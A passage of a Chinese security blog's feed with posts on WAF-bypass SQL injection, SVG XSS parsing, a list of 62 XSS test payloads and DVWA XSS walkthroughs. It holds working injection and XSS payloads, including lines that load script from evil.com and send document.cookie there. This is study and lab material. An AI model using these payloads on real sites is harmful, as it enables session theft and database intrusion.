-?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--  index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</code></pre><blockquote><p>单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少</p></blockquote><h3 id="过滤掉and和or情况下的盲注"><a href="#过滤掉and和or情况下的盲注" class="headerlink" title="过滤掉and和or情况下的盲注"></a>过滤掉and和or情况下的盲注</h3><p>假如有这样一个注入点</p><pre><code>index.php?uid=123</code></pre><p>但是and和or被过滤掉了，我们可以构造一下语句</p><pre><code>index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123</code></pre><blockquote><p>123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。</p></blockquote><h3 id="加括号"><a href="#加括号" class="headerlink" title="加括号"></a>加括号</h3><pre><code>/?id=1+union+(select+1,2+from+users)</code></pre><p>如果上面一条被WAF拦截了，可以试着加一些括号。</p><pre><code>/?id=1+union+(select+1,2+from+xxx)/?id=(1)union(select(1),mid(hash,1,32)from(users))/?id=1+union+(select&apos;1&apos;,concat(login,hash)from+users)/?id=(1)union(((((((select(1),hex(hash)from(users))))))))/?id=(1)or(0x50=0x50)</code></pre><h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、如果可能，采用基于IP的白名单；</p><p>2、对各种不能解析的内容，全部禁止访问；</p><p>3、解析的协议，要全面；</p><p>4、对各种不符合标准模式的访问，禁止；</p><p>5、WAF解析方式，与后台的WEB服务器、web应用、数据库的解析方式尽可能一致；</p><p>6、关键字的匹配，需要考虑诸多变形情况。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。&lt;/p&gt;
&lt;h2 id=&quot;WAF的功能&quot;&gt;&lt;a href=&quot;#WAF的功能&quot; class=&quot;headerlink&quot; title=&quot;WAF的功能&quot;&gt;&lt;/a&gt;WAF的功能&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;审计设备：用来截获
      
    
    </summary>
    
      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
    
    
  </entry>
  
  <entry>
    <title>SVG XSS黑魔法</title>
    <link href="http://yoursite.com/2018/12/02/SVG-XSS%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <id>http://yoursite.com/2018/12/02/SVG-XSS黑魔法/</id>
    <published>2018-12-02T06:52:12.000Z</published>
    <updated>2018-12-02T09:08:01.084Z</updated>
    
    <content type="html"><![CDATA[<p>先来看两个代码，一个可执行一个不可执行。</p><p>可执行：</p><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><p>不可执行：</p><pre><code>&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><p>那么为啥加了<svg>的可以执行？</svg></p><p>这就得由html解析流程说起了。</p><p>html解析到<svg>的时候会变成标签开始状态(Tag open state)，然后到标签名状态(Tag name state)，等等，最终到数据状态(Data state)，并释放当前标签的token，当解析器处于数据状态(Data state)时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</svg></p><p>svg属于外部元素。</p><p>外部元素来源于<strong>MathML</strong>和<strong>SVG</strong>命名空间。</p><p>而MathML（数学标记语言）是一种基于XML的标准。</p><p>那么可以猜测<svg>遵循XML和SVG的定义。</svg></p><p>在XML中，<code>&amp;#40;</code>会被解析成<code>(</code></p><blockquote><p>在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体</p></blockquote><pre><code>&lt;xml&gt;    &lt;name&gt;aaa&lt;/name&gt;    &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt;&lt;/xml&gt;</code></pre><p><img src="https://i.imgur.com/zbuGz8s.png" alt=""></p><p>当然，SVG标准中也定义了<code>script</code>标签的存在。</p><p>所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先来看两个代码，一个可执行一个不可执行。&lt;/p&gt;
&lt;p&gt;可执行：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert&amp;amp;#40;1)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不可执行：&lt;/p&gt;
&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS测试用例</title>
    <link href="http://yoursite.com/2018/12/01/XSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/"/>
    <id>http://yoursite.com/2018/12/01/XSS测试用例/</id>
    <published>2018-12-01T13:59:49.000Z</published>
    <updated>2018-12-02T07:15:35.373Z</updated>
    
    <content type="html"><![CDATA[<p>1.<code>&lt;script&gt; alert(1);&lt;/script&gt;</code></p><p>2.<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><p>3.<code>&lt;script  src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt;</code></p><p>4.<code>&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt;</code></p><p>5.<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;</code></p><p>6.<code>&lt;img src=liu.jpg onerror=alert(/xss/)/&gt;</code></p><p>7.<code>&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt;</code></p><p>8.<code>&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt;</code></p><p>9.<code>&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt;</code></p><p>10.<code>&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt;</code></p><p>11.<code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p><p>12.<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>13.<code>&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt;</code></p><p>14.<code>&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>15.<code>&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt;</code></p><p>16.<code>&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>17.<code>&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>18.<code>&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt;</code></p><p>19.<code>&#39;);alert(&#39;XSS</code></p><p>20.<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code></p><p>21.<code>[url=javascript:alert(&#39;XSS&#39;);]click me[/url]</code></p><p>22.<code>&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>23.<code>&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot;</code></p><p>24.<code>[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color]</code></p><p>25.<code>&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;</code></p><p>26.<code>window.alert(&quot;XSS&quot;);</code></p><p>27.<code>&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt;</code></p><p>28.<code>&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt;</code></p><p>29.<code>&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code><br>30.<code>&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt;</code></p><p>31.<code>&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>32.<code>&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;</code></p><p>33.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>34.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>35.<code>&lt;script&gt;var var=1; alert(var)&lt;/script&gt;</code></p><p>36.<code>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt;</code></p><p>37.<code>&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt;</code></p><p>38.<code>&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>39.<code>&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot;</code></p><p>40.<code>&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt;</code></p><p>41.<code>&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></p><p>42.<code>&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt;</code></p><p>43.<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></p><p>44.<code>&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</code></p><p>45.<code>[color=red width=expression(alert(123))][color]</code></p><p>46.<code>&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;</code></p><p>47.<code>Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt;</code></p><p>48.<code>&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt;</code></p><p>49.<code>&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>50.<code>&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt;</code></p><p>51.<code>&lt;div style=&quot;background:url(&#39;javascript:&#39;)</code></p><p>52.<code>&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>53.<code>&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></p><p>54.<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code></p><p>55.<code>&lt;q/oncut=open()&gt;</code></p><p>56.<code>&lt;q/oncut=alert(1)&gt;</code>//在限制长度的地方很有效</p><p>57.<code>&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效</code></p><p>58.<code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;</code></p><p>59.<code>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></p><p>60.<code>&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK</code></p><p>61.<code>&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</code></p><p>62.<code>&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.&lt;code&gt;&amp;lt;script&amp;gt; alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.
      
    
    </summary>
    
      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS绕过及DVWA实例</title>
    <link href="http://yoursite.com/2018/12/01/XSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B/"/>
    <id>http://yoursite.com/2018/12/01/XSS绕过及DVWA实例/</id>
    <published>2018-12-01T13:52:18.000Z</published>
    <updated>2018-12-02T07:12:54.413Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="最基本的用法："><a href="#最基本的用法：" class="headerlink" title="最基本的用法："></a>最基本的用法：</h2><p><code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><h2 id="黑名单绕过："><a href="#黑名单绕过：" class="headerlink" title="黑名单绕过："></a>黑名单绕过：</h2><p>大多数的场所是用的黑名单来做过滤器的。</p><ul><li>尝试插入比较正常的HTML标签，例如：<code>&lt;b&gt;</code>，<code>&lt;i&gt;</code>，<code>&lt;u&gt;</code>来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</li><li>尝试插入不闭合的标签，例如：<code>&lt;b</code>，<code>&lt;i</code>，<code>&lt;u</code>，<code>&lt;marquee</code>然后看一下返回响应，是否对开放的标签也有过滤。</li></ul><h2 id="大小写及重写的绕过"><a href="#大小写及重写的绕过" class="headerlink" title="大小写及重写的绕过:"></a>大小写及重写的绕过:</h2><p><code>&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt;</code></p><h2 id="事件绕过："><a href="#事件绕过：" class="headerlink" title="事件绕过："></a>事件绕过：</h2><p><code>利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt;</code></p><h3 id="相关JS事件："><a href="#相关JS事件：" class="headerlink" title="相关JS事件："></a>相关JS事件：</h3><p><img src="https://i.imgur.com/8cjjBPV.png" alt=""></p><h2 id="编码绕过："><a href="#编码绕过：" class="headerlink" title="编码绕过："></a>编码绕过：</h2><blockquote><p>当浏览器接受到一份HTML代码后，会对标签之间（<code>&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;</code>除外)、标签的属性中（<code>&lt;a href=&#39;xxxx&#39;&gt;</code>）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在<code>href=&#39;xx&#39;</code>这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段</p></blockquote><p>例如：<br><code>&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</code></p><blockquote><p>上述代码解析后为：<code>&lt;img src=1 onerror=alert(1)&gt;</code> ,可以弹窗</p></blockquote><p>在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释</p><p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></p><blockquote><p>被url解释器解释完后为<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code>，url中出现了<code>javascript:</code>，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。</p></blockquote><p>当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。<br><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt;</code></p><p>解码后为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,一样可以弹窗。但如果是：<br><code>&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt;</code></p><blockquote><p>解码后为 <code>&lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;</code>就不要指望他可以弹窗了。因为解码出来的<code>&#39;);alert(&#39;111</code>仍为被当作字符串而不会影响上下文。</p></blockquote><h2 id="利用String-fromCharCode进行编码绕过"><a href="#利用String-fromCharCode进行编码绕过" class="headerlink" title="利用String.fromCharCode进行编码绕过"></a>利用String.fromCharCode进行编码绕过</h2><p>测试代码：</p><pre><code>&lt;?phpfunction xss_check($str){    if(preg_match(&apos;/script|alert/i&apos;, $str))        return &apos;error&apos;;    else        return $str;}@$id = $_GET[&apos;id&apos;];echo xss_check($id);?&gt;</code></pre><p>屏蔽了alert(也可能是其他的)，此时可以使用编码绕过：</p><p><code>&lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt;</code></p><blockquote><p>将<code>javascript</code>和<code>alert</code>进行unicode编码实现绕过，成功弹窗。</p></blockquote><h4 id="利用String-fromCharCode进行编码绕过-1"><a href="#利用String-fromCharCode进行编码绕过-1" class="headerlink" title="利用String.fromCharCode进行编码绕过:"></a>利用String.fromCharCode进行编码绕过:</h4><p><code>&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt;</code></p><blockquote><p>其中<code>String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)</code>是<code>alert(/xss/)</code>编码后的内容，google插件hackbar就有此功能。</p></blockquote><p><img src="https://i.imgur.com/vyiYgVR.png" alt=""></p><h2 id="GBK宽字节绕过"><a href="#GBK宽字节绕过" class="headerlink" title="GBK宽字节绕过"></a>GBK宽字节绕过</h2><p>测试代码：</p><pre><code>&lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt;&lt;?php error_reporting(0);$conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn);#mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;;if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row);}}else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;;  } ?&gt;</code></pre><p><img src="https://i.imgur.com/0v8MiC1.png" alt=""></p><blockquote><p>直接<strong>‘</strong>会被转义，不会被执行。</p></blockquote><p><img src="https://i.imgur.com/0dSavf0.png" alt=""></p><blockquote><p>使用宽字符就可以被成功执行</p></blockquote><h3 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h3><ul><li><code>$_GET[‘id’]</code>经过<strong>addslashes</strong>编码之后带入了‘’</li><li>变成 <code>&lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt;</code></li><li>带入mysql处理时使用了gbk字符集</li><li><strong>%df%5c</strong> 運成功的吃掉了<strong>%5c</strong></li><li><strong>%27‘</strong>单引号成功闭合</li><li>GBK编码，编码范围是<strong>0x8140~0xFEFE</strong>（不包括xx7F），在遇到<strong>%df(ascii(223)) &gt;ascii(128)</strong>时自动拼接<strong>%5c，</strong>因此吃掉<strong>‘</strong>，而<strong>%27</strong>、<strong>%20</strong>小于<strong>ascii(128)</strong>的字符就保留了。</li></ul><h2 id="0字节绕过"><a href="#0字节绕过" class="headerlink" title="0字节绕过"></a>0字节绕过</h2><pre><code>&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</code></pre><p>在IE9及以下版本成功绕过。</p><h2 id="IE6下绕过"><a href="#IE6下绕过" class="headerlink" title="IE6下绕过"></a>IE6下绕过</h2><p>IE下还可利用javascript:alert(/xss/); 或css</p><pre><code>body {background:black;xss:expression(alert(/zhuling.wang/));/*IE6下测试*/}</code></pre><blockquote><p>成功绕过</p></blockquote><h2 id="DVWA测试用例"><a href="#DVWA测试用例" class="headerlink" title="DVWA测试用例"></a>DVWA测试用例</h2><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><h4 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h4><p>任意XSS都可用</p><h4 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h4><pre><code>&lt;script  &gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;img src=# onerror=alert(1)&gt;&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等</code></pre><h4 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h4><p>过滤掉script标签更严格，不能使用script标签</p><pre><code>&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;&lt;img src=# onerror=alert(1)&gt;</code></pre><p>其他html标签构造的事件还是可以使用的。</p><h4 id="不可能级别"><a href="#不可能级别" class="headerlink" title="不可能级别"></a>不可能级别</h4><p>用到了<code>htmlspecialchars()</code>，这个函数是将预定义的字符转换为 HTML 实体。<br>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li><blockquote><p>（大于）成为 &gt;</p></blockquote></li></ul><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><h4 id="低等级-1"><a href="#低等级-1" class="headerlink" title="低等级"></a>低等级</h4><p>没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。</p><p><code>&lt;img src=# onerror=alert(1)&gt;等等</code></p><h4 id="中等级-1"><a href="#中等级-1" class="headerlink" title="中等级"></a>中等级</h4><p>因为一上来就给Message添加了<code>htmlspecialchars</code>函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。<br>或者可以用<strong>burp</strong>抓包发送。</p><h4 id="高等级-1"><a href="#高等级-1" class="headerlink" title="高等级"></a>高等级</h4><p>message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。</p><p><img src="https://i.imgur.com/85bxZJs.png" alt=""></p><h4 id="不可能级别-1"><a href="#不可能级别-1" class="headerlink" title="不可能级别"></a>不可能级别</h4><p>这里对name和message都做了htmlspecialchars（）处理。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h4 id="低等级-2"><a href="#低等级-2" class="headerlink" title="低等级"></a>低等级</h4><p>直接在网页导航栏构造GET XSS即可完成注入</p><h4 id="中等级-2"><a href="#中等级-2" class="headerlink" title="中等级"></a>中等级</h4><p>源码显示会过滤掉script标签，但是直接用<code>&lt;img src=# onerror=alert(1)&gt;</code>没有直接执行，尝试闭合<strong>option</strong>没有成功,尝试闭合select标签成功执行。<br><img src="https://i.imgur.com/x7PaOkG.png" alt=""></p><blockquote><p><code>?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>也可以。</p></blockquote><h4 id="高等级-2"><a href="#高等级-2" class="headerlink" title="高等级"></a>高等级</h4><p>对传入值进行switch判断</p><p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p><blockquote><p><strong>#</strong>该字符后的数据不会发送到服务器端，从而绕过服务端过滤。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;最基本的用法：&quot;&gt;&lt;a href=&quot;#最基本的用法：&quot; class=&quot;headerlink&quot; title=&quot;最基本的用法：&quot;&gt;&lt;/a&gt;最基本的用法：&lt;/h2&gt;&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;x
      
    
    </summary>
    
      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
    
    
  </entry>
  
</feed>
